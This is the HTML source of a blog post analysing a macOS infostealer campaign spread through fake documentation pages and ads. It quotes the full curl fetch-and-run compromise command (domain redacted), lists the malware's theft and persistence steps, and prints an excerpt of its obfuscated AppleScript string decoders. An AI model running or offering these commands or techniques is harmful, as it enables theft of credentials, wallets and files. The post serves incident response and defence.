@@ -1,0 +1,754 @@
+<!DOCTYPE html>
+<html lang="en-US">
+
+<head>
+  <meta http-equiv="X-Clacks-Overhead" content="GNU Terry Pratchett" />
+  <meta charset="utf-8">
+  <meta name="viewport" content="width=device-width, initial-scale=1.0" />
+<link rel="shortcut icon" href="https://jcrumb.github.io/images/favicon.png" />
+<title>Breakdown of an Ongoing macOS Infostealer Campaign | Crumbliacci&#39;s Blog</title>
+<meta name="title" content="Breakdown of an Ongoing macOS Infostealer Campaign" />
+<meta name="description" content="I&rsquo;ve seen a couple of companies hit by a macOS infostealer through February/March 2026. Here are my notes on how it behaves, how it&rsquo;s distributed, and some IOCs." />
+<meta name="keywords" content="" />
+
+
+<meta property="og:url" content="https://jcrumb.github.io/breakdown-of-an-ongoing-macos-infostealer-campaign/">
+  <meta property="og:site_name" content="Crumbliacci&#39;s Blog">
+  <meta property="og:title" content="Breakdown of an Ongoing macOS Infostealer Campaign">
+  <meta property="og:description" content="I’ve seen a couple of companies hit by a macOS infostealer through February/March 2026. Here are my notes on how it behaves, how it’s distributed, and some IOCs.">
+  <meta property="og:locale" content="en_US">
+  <meta property="og:type" content="article">
+    <meta property="article:section" content="blog">
+    <meta property="article:published_time" content="2026-03-10T00:00:00+00:00">
+    <meta property="article:modified_time" content="2026-03-10T00:00:00+00:00">
+
+
+
+
+  <meta name="twitter:card" content="summary">
+  <meta name="twitter:title" content="Breakdown of an Ongoing macOS Infostealer Campaign">
+  <meta name="twitter:description" content="I’ve seen a couple of companies hit by a macOS infostealer through February/March 2026. Here are my notes on how it behaves, how it’s distributed, and some IOCs.">
+
+
+
+
+  <meta itemprop="name" content="Breakdown of an Ongoing macOS Infostealer Campaign">
+  <meta itemprop="description" content="I’ve seen a couple of companies hit by a macOS infostealer through February/March 2026. Here are my notes on how it behaves, how it’s distributed, and some IOCs.">
+  <meta itemprop="datePublished" content="2026-03-10T00:00:00+00:00">
+  <meta itemprop="dateModified" content="2026-03-10T00:00:00+00:00">
+  <meta itemprop="wordCount" content="2319">
+<meta name="referrer" content="no-referrer-when-downgrade" />
+
+  <style>
+  :root {
+    --width: 720px;
+    --font-main: Verdana, sans-serif;
+    --font-secondary: Verdana, sans-serif;
+    --font-scale: 1em;
+    --background-color: #fff;
+    --heading-color: #222;
+    --text-color: #444;
+    --link-color: #3273dc;
+    --visited-color: #8b6fcb;
+    --blockquote-color: #222;
+  }
+
+  @media (prefers-color-scheme: dark) {
+    :root {
+      --background-color: #01242e;
+      --heading-color: #eee;
+      --text-color: #ddd;
+      --link-color: #8cc2dd;
+      --visited-color: #8b6fcb;
+      --blockquote-color: #ccc;
+    }
+  }
+
+  body {
+    font-family: var(--font-secondary);
+    font-size: var(--font-scale);
+    margin: auto;
+    padding: 20px;
+    max-width: var(--width);
+    text-align: left;
+    background-color: var(--background-color);
+    word-wrap: break-word;
+    overflow-wrap: break-word;
+    line-height: 1.5;
+    color: var(--text-color);
+  }
+
+  h1,
+  h2,
+  h3,
+  h4,
+  h5,
+  h6 {
+    font-family: var(--font-main);
+    color: var(--heading-color);
+  }
+
+  a {
+    color: var(--link-color);
+    cursor: pointer;
+    text-decoration: none;
+  }
+
+  a:hover {
+    text-decoration: underline;
+  }
+
+  nav a {
+    margin-right: 8px;
+  }
+
+  strong,
+  b {
+    color: var(--heading-color);
+  }
+
+  button {
+    margin: 0;
+    cursor: pointer;
+  }
+
+  time {
+    font-family: monospace;
+    font-style: normal;
+    font-size: 15px;
+  }
+
+  main {
+    line-height: 1.6;
+  }
+
+  table {
+    width: 100%;
+  }
+
+  hr {
+    border: 0;
+    border-top: 1px dashed;
+  }
+
+  img {
+    max-width: 100%;
+  }
+
+  code {
+    font-family: monospace;
+    padding: 2px;
+    border-radius: 3px;
+  }
+
+  blockquote {
+    border-left: 1px solid #999;
+    color: var(--blockquote-color);
+    padding-left: 20px;
+    font-style: italic;
+  }
+
+  footer {
+    padding: 25px 0;
+    text-align: center;
+  }
+
+  .title:hover {
+    text-decoration: none;
+  }
+
+  .title h1 {
+    font-size: 1.5em;
+  }
+
+  .inline {
+    width: auto !important;
+  }
+
+  .highlight,
+  .code {
+    border-radius: 3px;
+    margin-block-start: 1em;
+    margin-block-end: 1em;
+    overflow-x: auto;
+  }
+
+   
+  ul.blog-posts {
+    list-style-type: none;
+    padding: unset;
+  }
+
+  ul.blog-posts li {
+    display: flex;
+  }
+
+  ul.blog-posts li span {
+    flex: 0 0 130px;
+  }
+
+  ul.blog-posts li a:visited {
+    color: var(--visited-color);
+  }
+
+</style>
+<style>
+  ul.blog-posts li {
+    flex-direction: column;
+    margin-bottom: 2rem;
+    padding-bottom: 2rem;
+    border-bottom: 1px solid var(--border-color, #eee);
+  }
+
+  ul.blog-posts li:last-child {
+    border-bottom: none;
+  }
+
+  ul.blog-posts li .post-title-row {
+    display: flex;
+    align-items: baseline;
+  }
+
+  ul.blog-posts li .post-title-row span {
+    flex: 0 0 130px;
+  }
+
+  ul.blog-posts li p {
+    margin: 0.15rem 0 0 130px;
+    color: var(--text-muted, #555);
+    font-size: 0.95em;
+  }
+</style>
+</head>
+
+<body>
+  <header><a href="/" class="title">
+  <h2>Crumbliacci&#39;s Blog</h2>
+</a>
+<nav>
+<a href="/">Home</a>
+
+</nav>
+</header>
+  <main>
+
+<h1>Breakdown of an Ongoing macOS Infostealer Campaign</h1>
+<p>
+  <i>
+    <time datetime='2026-03-10'>
+      2026-03-10
+    </time>
+  </i>
+</p>
+
+<content>
+  <p>A few weeks ago, we had a rather scary EDR notification pop up in our monitoring Slack channel. It said (paraphrased):</p>
+<blockquote>
+<p>A suspicious Unix shell command was run, we killed the process but check this shit out</p>
+</blockquote>
+<p>The actual command pasted was as follows (domain redacted):</p>
+<div class="highlight"><pre tabindex="0" style="background-color:#f0f0f0;-moz-tab-size:4;-o-tab-size:4;tab-size:4;-webkit-text-size-adjust:none;"><code class="language-sh" data-lang="sh"><span style="display:flex;"><span style="white-space:pre;-webkit-user-select:none;user-select:none;margin-right:0.4em;padding:0 0.4em 0 0.4em;color:#7f7f7f">1</span><span>/bin/bash -c <span style="color:#60a0b0;font-style:italic">#!/bin/bash curl -o /tmp/update https://&lt;REDACTED&gt;.com/n8n/update \</span>
+</span></span><span style="display:flex;"><span style="white-space:pre;-webkit-user-select:none;user-select:none;margin-right:0.4em;padding:0 0.4em 0 0.4em;color:#7f7f7f">2</span><span> <span style="color:#666">&amp;&amp;</span> xattr -c /tmp/update <span style="color:#666">&amp;&amp;</span> chmod +x /tmp/update <span style="color:#666">&amp;&amp;</span> /tmp/update
+</span></span></code></pre></div><p>Suspicious, indeed. Shoutout to Crowdstrike EDR for stopping this thing in its tracks. More recently, a founder friend of mine reached out
+and asked if I could hop on a call as one of their engineers seemed to have run some malware on their machine and could I jump in to
+give them a hand with incident response?</p>
+<p>As soon as I started looking at the logs, it became pretty clear that this was the same as what I saw a few weeks prior, but my
+friend&rsquo;s company hadn&rsquo;t been so lucky. Their EDR solution had noted that this looked suspicious as all get out and set off alarm bells,
+but only <em>after</em> allowing the execution to proceed.</p>
+<h1 id="we-have-all-been-trained-to-do-stupid-things">We Have All Been Trained to do Stupid Things</h1>
+<p>Much has already been written about similar ongoing campaigns, but the high level way they work is this:</p>
+<ol>
+<li>The threat actor compromises one or several Google Ads accounts (the exact mechanism will vary).</li>
+<li>They also compromise insecure personal websites, domains, or register throwaway subdomains on free hosting sites.</li>
+<li>Armed with these two tools, they clone documentation sites for tools such as Claude Code and place ads on Google
+to get their faked sites to the top of search results.</li>
+<li>The fake sites have install instructions that give you malware to run.</li>
+<li>You, the user, helpfully run the malware for the attacker.</li>
+</ol>
+<p>The general process here combines the techniques of &ldquo;malvertising&rdquo; and &ldquo;ClickFix&rdquo;. It&rsquo;s easy to blame the individuals
+who fall for this, but really, this is an industry-wide problem that has been <em>years</em> in the making. For a good long time,
+we have all been conditioned to think that <code>curl ... | bash</code> is a valid installation method and not a <strong>patently insane way to distribute software</strong>.
+Sure, it&rsquo;s convenient, but this particular security bad habit is now coming home to roost in a big way.</p>
+<p>The ongoing LLM craze means there are lots of new vibe coders and fledgling software engineers to exploit, but in both cases I saw these
+were not the demographic being hit; these were experienced engineers who were just in a hurry and didn&rsquo;t quite stop to evaluate
+whether that domain did in fact look right after pasting.</p>
+<h1 id="so-you-ran-some-malware">So, You Ran Some Malware</h1>
+<p>Let&rsquo;s talk about what happens when you actually run this malware. Based on the collected forensics in the successful execution, I saw the following
+play out over the course of about ~10 seconds based on the timestamps in EDR logs. The below was all executed via <code>/tmp/update</code> from the initial
+compromise command, which is <em>heavily</em> obfuscated AppleScript. Using native tools like this is a common way to evade detection, and I&rsquo;ll break down
+the obfuscation layer below.</p>
+<ol>
+<li>First, it creates a directory at <code>/tmp/&lt;random 5 digit id&gt;</code> to stage files into.</li>
+<li>It hides the terminal window to mask the other commands being run.</li>
+<li>It then reads the <code>USER</code> attribute so it can construct a path to the user&rsquo;s home directory.</li>
+<li>It writes a file to the user&rsquo;s home directory with command &amp; control (C2) configuration.</li>
+<li>It starts harvesting files, including browser cookies, crypto wallets, notes, files from <code>~/Desktop</code> and <code>~/Documents</code>,
+password vaults, keychains, etc. If it needs the user to unlock the keychain, it pops up a fake &ldquo;Required Application Helper&rdquo; dialog
+to harvest their system password.</li>
+<li>Next, it zips up all these files into <code>/tmp/out.zip</code> and <code>POST</code>s them to a URL from the C2 config.</li>
+<li>To persist, it installs itself via <code>launchctl</code> so the infostealer runs on each boot.</li>
+<li>Finally, it cleans up after itself, removing <code>/tmp/out.zip</code> and the staging directory.</li>
+</ol>
+<p>Most of the files used have innocuous names like <code>.mainhelper</code> in order to help with persistence. If you didn&rsquo;t have an EDR tool
+installed to alert on these behaviours, you&rsquo;d likely never notice anything wrong until your crypto wallet was emptied.</p>
+<h1 id="adventures-in-obfuscation">Adventures in Obfuscation</h1>
+<p>Looking at the actual script that gets initially executed feels like someone has spiked your drink and you&rsquo;ve forgotten how to read.
+The code is heavily obfuscated, and doing a string search won&rsquo;t help you find out what was harvested. Here&rsquo;s an excerpt:</p>
+<div class="highlight"><pre tabindex="0" style="background-color:#f0f0f0;-moz-tab-size:4;-o-tab-size:4;tab-size:4;-webkit-text-size-adjust:none;"><code class="language-AppleScript" data-lang="AppleScript"><span style="display:flex;"><span style="white-space:pre;-webkit-user-select:none;user-select:none;margin-right:0.4em;padding:0 0.4em 0 0.4em;color:#7f7f7f"> 1</span><span><span style="color:#007020;font-weight:bold">on</span> <span style="color:#bb60d5">cdftjcxbo</span>(<span style="color:#bb60d5">ikigxsgf</span>, <span style="color:#bb60d5">ieoycfoei</span>)
+</span></span><span style="display:flex;"><span style="white-space:pre;-webkit-user-select:none;user-select:none;margin-right:0.4em;padding:0 0.4em 0 0.4em;color:#7f7f7f"> 2</span><span><span style="color:#007020;font-weight:bold">set</span> <span style="color:#bb60d5">sodzerodpta</span> <span style="color:#007020;font-weight:bold">to</span> <span style="color:#4070a0">&#34;&#34;</span>
+</span></span><span style="display:flex;"><span style="white-space:pre;-webkit-user-select:none;user-select:none;margin-right:0.4em;padding:0 0.4em 0 0.4em;color:#7f7f7f"> 3</span><span><span style="color:#007020;font-weight:bold">set</span> <span style="color:#bb60d5">oxebtefnj</span> <span style="color:#007020;font-weight:bold">to</span> <span style="color:#40a070">0</span>
+</span></span><span style="display:flex;"><span style="white-space:pre;-webkit-user-select:none;user-select:none;margin-right:0.4em;padding:0 0.4em 0 0.4em;color:#7f7f7f"> 4</span><span><span style="color:#007020;font-weight:bold">repeat</span> <span style="color:#007020;font-weight:bold">with</span> <span style="color:#bb60d5">gufxxjwnzhaz</span> <span style="color:#007020;font-weight:bold">from</span> <span style="color:#40a070">1</span> <span style="color:#007020;font-weight:bold">to</span> <span style="color:#007020">count</span> <span style="color:#007020;font-weight:bold">of</span> <span style="color:#bb60d5">ikigxsgf</span>
+</span></span><span style="display:flex;"><span style="white-space:pre;-webkit-user-select:none;user-select:none;margin-right:0.4em;padding:0 0.4em 0 0.4em;color:#7f7f7f"> 5</span><span><span style="color:#007020;font-weight:bold">set</span> <span style="color:#bb60d5">oxebtefnj</span> <span style="color:#007020;font-weight:bold">to</span> (<span style="color:#bb60d5">oxebtefnj</span> <span style="color:#666">+</span> (<span style="color:#007020">item</span> <span style="color:#bb60d5">gufxxjwnzhaz</span> <span style="color:#007020;font-weight:bold">of</span> <span style="color:#bb60d5">ikigxsgf</span>)) <span style="color:#007020;font-weight:bold">mod</span> <span style="color:#40a070">9999</span>
+</span></span><span style="display:flex;"><span style="white-space:pre;-webkit-user-select:none;user-select:none;margin-right:0.4em;padding:0 0.4em 0 0.4em;color:#7f7f7f"> 6</span><span><span style="color:#007020;font-weight:bold">set</span> <span style="color:#bb60d5">sodzerodpta</span> <span style="color:#007020;font-weight:bold">to</span> <span style="color:#bb60d5">sodzerodpta</span> <span style="color:#666">&amp;</span> (<span style="color:#007020">character</span> <span style="color:#4070a0">id</span> ((<span style="color:#007020">item</span> <span style="color:#bb60d5">gufxxjwnzhaz</span> <span style="color:#007020;font-weight:bold">of</span> <span style="color:#bb60d5">ikigxsgf</span>) <span style="color:#666">-</span> (<span style="color:#007020">item</span> <span style="color:#bb60d5">gufxxjwnzhaz</span> <span style="color:#007020;font-weight:bold">of</span> <span style="color:#bb60d5">ieoycfoei</span>)))
+</span></span><span style="display:flex;"><span style="white-space:pre;-webkit-user-select:none;user-select:none;margin-right:0.4em;padding:0 0.4em 0 0.4em;color:#7f7f7f"> 7</span><span><span style="color:#007020;font-weight:bold">set</span> <span style="color:#bb60d5">oxebtefnj</span> <span style="color:#007020;font-weight:bold">to</span> (<span style="color:#bb60d5">oxebtefnj</span> <span style="color:#666">*</span> <span style="color:#40a070">3</span>) <span style="color:#007020;font-weight:bold">mod</span> <span style="color:#40a070">9999</span>
+</span></span><span style="display:flex;"><span style="white-space:pre;-webkit-user-select:none;user-select:none;margin-right:0.4em;padding:0 0.4em 0 0.4em;color:#7f7f7f"> 8</span><span><span style="color:#007020;font-weight:bold">end</span> <span style="color:#007020;font-weight:bold">repeat</span>
+</span></span><span style="display:flex;"><span style="white-space:pre;-webkit-user-select:none;user-select:none;margin-right:0.4em;padding:0 0.4em 0 0.4em;color:#7f7f7f"> 9</span><span><span style="color:#60add5">return</span> <span style="color:#bb60d5">sodzerodpta</span>
+</span></span><span style="display:flex;"><span style="white-space:pre;-webkit-user-select:none;user-select:none;margin-right:0.4em;padding:0 0.4em 0 0.4em;color:#7f7f7f">10</span><span><span style="color:#007020;font-weight:bold">end</span> <span style="color:#bb60d5">cdftjcxbo</span>
+</span></span><span style="display:flex;"><span style="white-space:pre;-webkit-user-select:none;user-select:none;margin-right:0.4em;padding:0 0.4em 0 0.4em;color:#7f7f7f">11</span><span>
+</span></span><span style="display:flex;"><span style="white-space:pre;-webkit-user-select:none;user-select:none;margin-right:0.4em;padding:0 0.4em 0 0.4em;color:#7f7f7f">12</span><span><span style="color:#007020;font-weight:bold">on</span> <span style="color:#bb60d5">cmbnxmjiwwr</span>(<span style="color:#bb60d5">fpwkmuyobijj</span>, <span style="color:#bb60d5">pcjvewnfyml</span>)
+</span></span><span style="display:flex;"><span style="white-space:pre;-webkit-user-select:none;user-select:none;margin-right:0.4em;padding:0 0.4em 0 0.4em;color:#7f7f7f">13</span><span><span style="color:#007020;font-weight:bold">set</span> <span style="color:#bb60d5">dpruioywaxp</span> <span style="color:#007020;font-weight:bold">to</span> <span style="color:#4070a0">&#34;&#34;</span>
+</span></span><span style="display:flex;"><span style="white-space:pre;-webkit-user-select:none;user-select:none;margin-right:0.4em;padding:0 0.4em 0 0.4em;color:#7f7f7f">14</span><span><span style="color:#007020;font-weight:bold">set</span> <span style="color:#bb60d5">mikzetljb</span> <span style="color:#007020;font-weight:bold">to</span> <span style="color:#40a070">1</span>
+</span></span><span style="display:flex;"><span style="white-space:pre;-webkit-user-select:none;user-select:none;margin-right:0.4em;padding:0 0.4em 0 0.4em;color:#7f7f7f">15</span><span><span style="color:#007020;font-weight:bold">repeat</span> <span style="color:#007020;font-weight:bold">with</span> <span style="color:#bb60d5">gnodqyefnwb</span> <span style="color:#007020;font-weight:bold">from</span> <span style="color:#40a070">1</span> <span style="color:#007020;font-weight:bold">to</span> <span style="color:#007020">count</span> <span style="color:#007020;font-weight:bold">of</span> <span style="color:#bb60d5">fpwkmuyobijj</span>
+</span></span><span style="display:flex;"><span style="white-space:pre;-webkit-user-select:none;user-select:none;margin-right:0.4em;padding:0 0.4em 0 0.4em;color:#7f7f7f">16</span><span><span style="color:#007020;font-weight:bold">set</span> <span style="color:#bb60d5">mikzetljb</span> <span style="color:#007020;font-weight:bold">to</span> (<span style="color:#bb60d5">mikzetljb</span> <span style="color:#666">+</span> (<span style="color:#007020">item</span> <span style="color:#bb60d5">gnodqyefnwb</span> <span style="color:#007020;font-weight:bold">of</span> <span style="color:#bb60d5">pcjvewnfyml</span>)) <span style="color:#007020;font-weight:bold">mod</span> <span style="color:#40a070">9999</span>
+</span></span><span style="display:flex;"><span style="white-space:pre;-webkit-user-select:none;user-select:none;margin-right:0.4em;padding:0 0.4em 0 0.4em;color:#7f7f7f">17</span><span><span style="color:#007020;font-weight:bold">set</span> <span style="color:#bb60d5">dpruioywaxp</span> <span style="color:#007020;font-weight:bold">to</span> <span style="color:#bb60d5">dpruioywaxp</span> <span style="color:#666">&amp;</span> (<span style="color:#007020">character</span> <span style="color:#4070a0">id</span> ((<span style="color:#007020">item</span> <span style="color:#bb60d5">gnodqyefnwb</span> <span style="color:#007020;font-weight:bold">of</span> <span style="color:#bb60d5">fpwkmuyobijj</span>) <span style="color:#666">+</span> (<span style="color:#007020">item</span> <span style="color:#bb60d5">gnodqyefnwb</span> <span style="color:#007020;font-weight:bold">of</span> <span style="color:#bb60d5">pcjvewnfyml</span>)))
+</span></span><span style="display:flex;"><span style="white-space:pre;-webkit-user-select:none;user-select:none;margin-right:0.4em;padding:0 0.4em 0 0.4em;color:#7f7f7f">18</span><span><span style="color:#007020;font-weight:bold">set</span> <span style="color:#bb60d5">mikzetljb</span> <span style="color:#007020;font-weight:bold">to</span> <span style="color:#bb60d5">mikzetljb</span> <span style="color:#666">+</span> <span style="color:#40a070">1</span>
+</span></span><span style="display:flex;"><span style="white-space:pre;-webkit-user-select:none;user-select:none;margin-right:0.4em;padding:0 0.4em 0 0.4em;color:#7f7f7f">19</span><span><span style="color:#007020;font-weight:bold">end</span> <span style="color:#007020;font-weight:bold">repeat</span>
+</span></span><span style="display:flex;"><span style="white-space:pre;-webkit-user-select:none;user-select:none;margin-right:0.4em;padding:0 0.4em 0 0.4em;color:#7f7f7f">20</span><span><span style="color:#60add5">return</span> <span style="color:#bb60d5">dpruioywaxp</span>
+</span></span><span style="display:flex;"><span style="white-space:pre;-webkit-user-select:none;user-select:none;margin-right:0.4em;padding:0 0.4em 0 0.4em;color:#7f7f7f">21</span><span><span style="color:#007020;font-weight:bold">end</span> <span style="color:#bb60d5">cmbnxmjiwwr</span>
+</span></span><span style="display:flex;"><span style="white-space:pre;-webkit-user-select:none;user-select:none;margin-right:0.4em;padding:0 0.4em 0 0.4em;color:#7f7f7f">22</span><span>
+</span></span><span style="display:flex;"><span style="white-space:pre;-webkit-user-select:none;user-select:none;margin-right:0.4em;padding:0 0.4em 0 0.4em;color:#7f7f7f">23</span><span><span style="color:#007020;font-weight:bold">on</span> <span style="color:#bb60d5">czxucxewqe</span>(<span style="color:#bb60d5">yhkylofpi</span>, <span style="color:#bb60d5">dofhtoiddo</span>, <span style="color:#bb60d5">zkhoxipck</span>)
+</span></span><span style="display:flex;"><span style="white-space:pre;-webkit-user-select:none;user-select:none;margin-right:0.4em;padding:0 0.4em 0 0.4em;color:#7f7f7f">24</span><span><span style="color:#007020;font-weight:bold">set</span> <span style="color:#bb60d5">kutavyrrjoki</span> <span style="color:#007020;font-weight:bold">to</span> <span style="color:#4070a0">&#34;&#34;</span>
+</span></span><span style="display:flex;"><span style="white-space:pre;-webkit-user-select:none;user-select:none;margin-right:0.4em;padding:0 0.4em 0 0.4em;color:#7f7f7f">25</span><span><span style="color:#007020;font-weight:bold">set</span> <span style="color:#bb60d5">oyuuyqoiuxc</span> <span style="color:#007020;font-weight:bold">to</span> <span style="color:#40a070">0</span>
+</span></span><span style="display:flex;"><span style="white-space:pre;-webkit-user-select:none;user-select:none;margin-right:0.4em;padding:0 0.4em 0 0.4em;color:#7f7f7f">26</span><span><span style="color:#007020;font-weight:bold">repeat</span> <span style="color:#007020;font-weight:bold">with</span> <span style="color:#bb60d5">iqbrjbegq</span> <span style="color:#007020;font-weight:bold">from</span> <span style="color:#40a070">1</span> <span style="color:#007020;font-weight:bold">to</span> <span style="color:#007020">count</span> <span style="color:#007020;font-weight:bold">of</span> <span style="color:#bb60d5">yhkylofpi</span>
+</span></span><span style="display:flex;"><span style="white-space:pre;-webkit-user-select:none;user-select:none;margin-right:0.4em;padding:0 0.4em 0 0.4em;color:#7f7f7f">27</span><span><span style="color:#007020;font-weight:bold">set</span> <span style="color:#bb60d5">lqgiwmzczxv</span> <span style="color:#007020;font-weight:bold">to</span> ((<span style="color:#007020">item</span> <span style="color:#bb60d5">iqbrjbegq</span> <span style="color:#007020;font-weight:bold">of</span> <span style="color:#bb60d5">yhkylofpi</span>) <span style="color:#666">-</span> <span style="color:#bb60d5">zkhoxipck</span>)
+</span></span><span style="display:flex;"><span style="white-space:pre;-webkit-user-select:none;user-select:none;margin-right:0.4em;padding:0 0.4em 0 0.4em;color:#7f7f7f">28</span><span><span style="color:#007020;font-weight:bold">set</span> <span style="color:#bb60d5">lqgiwmzczxv</span> <span style="color:#007020;font-weight:bold">to</span> <span style="color:#bb60d5">lqgiwmzczxv</span> <span style="color:#666">-</span> (<span style="color:#007020">item</span> <span style="color:#bb60d5">iqbrjbegq</span> <span style="color:#007020;font-weight:bold">of</span> <span style="color:#bb60d5">dofhtoiddo</span>)
+</span></span><span style="display:flex;"><span style="white-space:pre;-webkit-user-select:none;user-select:none;margin-right:0.4em;padding:0 0.4em 0 0.4em;color:#7f7f7f">29</span><span><span style="color:#007020;font-weight:bold">set</span> <span style="color:#bb60d5">kutavyrrjoki</span> <span style="color:#007020;font-weight:bold">to</span> <span style="color:#bb60d5">kutavyrrjoki</span> <span style="color:#666">&amp;</span> (<span style="color:#007020">character</span> <span style="color:#4070a0">id</span> <span style="color:#bb60d5">lqgiwmzczxv</span>)
+</span></span><span style="display:flex;"><span style="white-space:pre;-webkit-user-select:none;user-select:none;margin-right:0.4em;padding:0 0.4em 0 0.4em;color:#7f7f7f">30</span><span><span style="color:#007020;font-weight:bold">set</span> <span style="color:#bb60d5">oyuuyqoiuxc</span> <span style="color:#007020;font-weight:bold">to</span> (<span style="color:#bb60d5">oyuuyqoiuxc</span> <span style="color:#666">+</span> <span style="color:#bb60d5">lqgiwmzczxv</span>) <span style="color:#007020;font-weight:bold">mod</span> <span style="color:#40a070">9999</span>
+</span></span><span style="display:flex;"><span style="white-space:pre;-webkit-user-select:none;user-select:none;margin-right:0.4em;padding:0 0.4em 0 0.4em;color:#7f7f7f">31</span><span><span style="color:#007020;font-weight:bold">end</span> <span style="color:#007020;font-weight:bold">repeat</span>
+</span></span><span style="display:flex;"><span style="white-space:pre;-webkit-user-select:none;user-select:none;margin-right:0.4em;padding:0 0.4em 0 0.4em;color:#7f7f7f">32</span><span><span style="color:#60add5">return</span> <span style="color:#bb60d5">kutavyrrjoki</span>
+</span></span><span style="display:flex;"><span style="white-space:pre;-webkit-user-select:none;user-select:none;margin-right:0.4em;padding:0 0.4em 0 0.4em;color:#7f7f7f">33</span><span><span style="color:#007020;font-weight:bold">end</span> <span style="color:#bb60d5">czxucxewqe</span>
+</span></span><span style="display:flex;"><span style="white-space:pre;-webkit-user-select:none;user-select:none;margin-right:0.4em;padding:0 0.4em 0 0.4em;color:#7f7f7f">34</span><span>
+</span></span><span style="display:flex;"><span style="white-space:pre;-webkit-user-select:none;user-select:none;margin-right:0.4em;padding:0 0.4em 0 0.4em;color:#7f7f7f">35</span><span><span style="color:#007020;font-weight:bold">on</span> <span style="color:#bb60d5">lewqomem</span>(<span style="color:#bb60d5">lrizipvij</span>)
+</span></span><span style="display:flex;"><span style="white-space:pre;-webkit-user-select:none;user-select:none;margin-right:0.4em;padding:0 0.4em 0 0.4em;color:#7f7f7f">36</span><span>	<span style="color:#007020;font-weight:bold">try</span>
+</span></span><span style="display:flex;"><span style="white-space:pre;-webkit-user-select:none;user-select:none;margin-right:0.4em;padding:0 0.4em 0 0.4em;color:#7f7f7f">37</span><span>		<span style="color:#007020;font-weight:bold">set</span> <span style="color:#bb60d5">zyasodofd</span> <span style="color:#007020;font-weight:bold">to</span> <span style="color:#007020">quoted form</span> <span style="color:#007020;font-weight:bold">of</span> (<span style="color:#bb60d5">POSIX</span> <span style="color:#4070a0">path</span> <span style="color:#007020;font-weight:bold">of</span> <span style="color:#bb60d5">lrizipvij</span>)
+</span></span><span style="display:flex;"><span style="white-space:pre;-webkit-user-select:none;user-select:none;margin-right:0.4em;padding:0 0.4em 0 0.4em;color:#7f7f7f">38</span><span>		<span style="color:#007020">do shell script</span> (<span style="color:#bb60d5">cdftjcxbo</span>({<span style="color:#40a070">305</span>, <span style="color:#40a070">186</span>, <span style="color:#40a070">278</span>, <span style="color:#40a070">283</span>, <span style="color:#40a070">321</span>, <span style="color:#40a070">88</span>, <span style="color:#40a070">117</span>, <span style="color:#40a070">167</span>, <span style="color:#40a070">240</span>}, {<span style="color:#40a070">196</span>, <span style="color:#40a070">79</span>, <span style="color:#40a070">178</span>, <span style="color:#40a070">178</span>, <span style="color:#40a070">207</span>, <span style="color:#40a070">56</span>, <span style="color:#40a070">72</span>, <span style="color:#40a070">55</span>, <span style="color:#40a070">208</span>})) <span style="color:#666">&amp;</span> <span style="color:#bb60d5">zyasodofd</span>
+</span></span><span style="display:flex;"><span style="white-space:pre;-webkit-user-select:none;user-select:none;margin-right:0.4em;padding:0 0.4em 0 0.4em;color:#7f7f7f">39</span><span>	<span style="color:#007020;font-weight:bold">end</span> <span style="color:#007020;font-weight:bold">try</span>
+</span></span><span style="display:flex;"><span style="white-space:pre;-webkit-user-select:none;user-select:none;margin-right:0.4em;padding:0 0.4em 0 0.4em;color:#7f7f7f">40</span><span><span style="color:#007020;font-weight:bold">end</span> <span style="color:#bb60d5">lewqomem</span>
+</span></span><span style="display:flex;"><span style="white-space:pre;-webkit-user-select:none;user-select:none;margin-right:0.4em;padding:0 0.4em 0 0.4em;color:#7f7f7f">41</span><span>
+</span></span><span style="display:flex;"><span style="white-space:pre;-webkit-user-select:none;user-select:none;margin-right:0.4em;padding:0 0.4em 0 0.4em;color:#7f7f7f">42</span><span><span style="color:#007020;font-weight:bold">on</span> <span style="color:#bb60d5">imxovxyrmjr</span>(<span style="color:#bb60d5">uhnbyobcd</span>)
+</span></span><span style="display:flex;"><span style="white-space:pre;-webkit-user-select:none;user-select:none;margin-right:0.4em;padding:0 0.4em 0 0.4em;color:#7f7f7f">43</span><span>	<span style="color:#007020;font-weight:bold">try</span>
+</span></span><span style="display:flex;"><span style="white-space:pre;-webkit-user-select:none;user-select:none;margin-right:0.4em;padding:0 0.4em 0 0.4em;color:#7f7f7f">44</span><span>		<span style="color:#007020;font-weight:bold">set</span> <span style="color:#bb60d5">abuscytik</span> <span style="color:#007020;font-weight:bold">to</span> <span style="color:#bb60d5">POSIX</span> <span style="color:#bb60d5">file</span> <span style="color:#bb60d5">uhnbyobcd</span>
+</span></span><span style="display:flex;"><span style="white-space:pre;-webkit-user-select:none;user-select:none;margin-right:0.4em;padding:0 0.4em 0 0.4em;color:#7f7f7f">45</span><span>		<span style="color:#007020;font-weight:bold">set</span> <span style="color:#bb60d5">pyrykioedj</span> <span style="color:#007020;font-weight:bold">to</span> <span style="color:#007020">read</span> <span style="color:#bb60d5">abuscytik</span>
+</span></span><span style="display:flex;"><span style="white-space:pre;-webkit-user-select:none;user-select:none;margin-right:0.4em;padding:0 0.4em 0 0.4em;color:#7f7f7f">46</span><span>		<span style="color:#60add5">return</span> <span style="color:#bb60d5">pyrykioedj</span>
+</span></span><span style="display:flex;"><span style="white-space:pre;-webkit-user-select:none;user-select:none;margin-right:0.4em;padding:0 0.4em 0 0.4em;color:#7f7f7f">47</span><span>	<span style="color:#007020;font-weight:bold">end</span> <span style="color:#007020;font-weight:bold">try</span>
+</span></span><span style="display:flex;"><span style="white-space:pre;-webkit-user-select:none;user-select:none;margin-right:0.4em;padding:0 0.4em 0 0.4em;color:#7f7f7f">48</span><span>	<span style="color:#60add5">return</span> <span style="color:#4070a0">&#34;&#34;</span>
+</span></span><span style="display:flex;"><span style="white-space:pre;-webkit-user-select:none;user-select:none;margin-right:0.4em;padding:0 0.4em 0 0.4em;color:#7f7f7f">49</span><span><span style="color:#007020;font-weight:bold">end</span> <span style="color:#bb60d5">imxovxyrmjr</span>
+</span></span></code></pre></div><p>The key magic is the three functions defined at the top: all strings used in this malware are hidden as arrays of numbers, which correspond to
+ASCII character IDs. The three functions <code>cdftjcxbo</code>, <code>cmbnxmjiwwr</code>, and <code>czxucxewqe</code> return strings from two arrays of numbers by either
+adding, subtracting, or adding with a constant the Nth item in each list. There are also some dummy variables in there that appear to exist
+solely to make behavioural analysis harder; they&rsquo;re calculated and updated but never read or returned. Let&rsquo;s look at one of these in detail:</p>
